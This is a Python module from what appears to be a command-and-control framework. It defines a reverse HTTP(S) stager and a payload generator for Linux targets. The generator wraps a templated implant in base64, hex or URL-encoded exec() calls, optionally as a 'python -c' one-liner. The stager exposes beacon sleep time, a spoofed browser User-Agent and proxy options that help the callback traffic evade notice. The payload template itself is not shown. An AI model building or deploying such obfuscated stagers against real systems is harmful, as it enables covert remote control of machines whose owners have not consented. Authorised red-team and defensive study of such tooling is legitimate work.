import base64
import os
import urllib
from typing import TYPE_CHECKING

import jinja2

from phoenix.server.utils.options import (AddressType, ChoiceType,
                                          DefaultStagerPool, IntegerType,
                                          Option, OptionPool, StringType)

from ..base_stager import BasePayload, BaseStager, FinalPayload

if TYPE_CHECKING:
    from phoenix.server.database import StagerModel


class PythonPayload(BasePayload):
    name = "Python"
    description = "Python Payload"
    author = "Screamz2k"
    supported_target_os = ["linux"]
    supported_target_arch = ["x64", "x86"]
    supported_execution_methods = [
        "direct",
        "thread",
        "process",
        "external",
    ]
    supported_code_types = ["shellcode", "compiled", "native"]
    supported_languages = ["python", "bash"]
    end_format = "py"
    compiled = False
    options = OptionPool()

    @classmethod
    def generate(
        cls, stager_db: "StagerModel", one_liner: bool = False, recompile: bool = False
    ) -> "FinalPayload":
        jinja2_env = jinja2.Environment(
            loader=jinja2.FileSystemLoader(os.path.dirname(os.path.abspath(__file__))),
            trim_blocks=True,
            lstrip_blocks=True,
            autoescape=True,
        )
        template = jinja2_env.get_template("payloads/python.py")
        output = template.render(stager=stager_db)
        if stager_db.encoding == "base64":
            output = f"import base64;exec(base64.b64decode('{base64.b64encode(output.encode()).decode()}'))"
        elif stager_db.encoding == "hex":
            output = (
                f"import codecs;exec(codecs.decode('{output.encode().hex()}', 'hex'))"
            )
        elif stager_db.encoding == "url":
            output = f"import urllib.parse;exec(urllib.parse.unquote('{urllib.parse.quote(output)}'))"

        if one_liner:
            output = 'python -c "' + output + '"'
        return FinalPayload(cls, stager_db, output)

    def is_compiled(self, stager_db: "StagerModel") -> bool:
        return False


class Stager(BaseStager):
    name = "http-reverse"
    description = "Reverse HTTP(S) stager"
    author: str = "Screamz2k"
    payloads = {"python": PythonPayload}
    options = DefaultStagerPool(
        [
            Option(
                name="Sleep Time",
                description="The time to sleep between each request",
                real_name="sleep-time",
                type=IntegerType(),
                default=5,
                required=True,
            ),
            Option(
                name="Request User-Agent",
                real_name="user-agent",
                description="The User-Agent to use.",
                type=StringType(),
                default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
            ),
            Option(
                name="Proxy address",
                real_name="proxy_address",
                description="The address of a proxy to use.",
                type=AddressType(),
            ),
            Option(
                name="Proxy port",
                real_name="proxy_port",
                description="The port of a proxy to use.",
                type=IntegerType(),
                default=8080,
            ),
            Option(
                name="Proxy authentication",
                real_name="proxy_auth",
                description="The Authentication to use (format=username:password).",
                type=StringType(),
                default="",
            ),
        ],
        list(payloads.keys()),
    )
